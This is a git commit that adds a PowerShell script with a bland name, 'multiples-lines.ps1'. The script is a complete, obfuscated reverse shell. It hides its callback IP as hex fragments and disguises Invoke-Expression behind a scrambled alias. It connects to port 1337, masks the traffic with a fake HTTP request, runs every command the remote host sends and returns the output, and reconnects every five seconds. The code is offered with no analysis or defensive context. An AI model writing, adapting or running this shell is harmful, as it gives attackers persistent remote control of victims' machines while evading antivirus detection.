9e7847c44d5bebe98c53a434bebd0118f0d8282c
R4ichu | Powershell <bblgratuitbblgratuit@gmail.com>
2022-05-20 12:41:21 +0200

    Create multiples-lines.ps1

---
+++ multiples-lines.ps1
@@ -0,0 +1,21 @@
+while ($true) {
+    $px = "c0","a8","a","1"
+    $p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.'
+    $w = "GET /amsi.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36`r`nAccept: text/html`r`n`r`n"
+    $s = [System.Text.ASCIIEncoding]
+    [byte[]]$b = 0..65535|%{0}
+    $x = "n-eiorvsxpk5"
+    Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])
+    $y = New-Object System.Net.Sockets.TCPClient($p,1337)
+    $z = $y.GetStream()
+    $d = $s::UTF8.GetBytes($w)
+    $z.Write($d, 0, $d.Length)
+    $t = (n-eiorvsxpk5 whoami) + "$ "
+    while(($l = $z.Read($b, 0, $b.Length)) -ne 0){
+        $v = (New-Object -TypeName $s).GetString($b,0, $l)        
+        $d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t)
+        $z.Write($d, 0, $d.Length)
+    }
+    $y.Close()
+    Start-Sleep -Seconds 5
+}
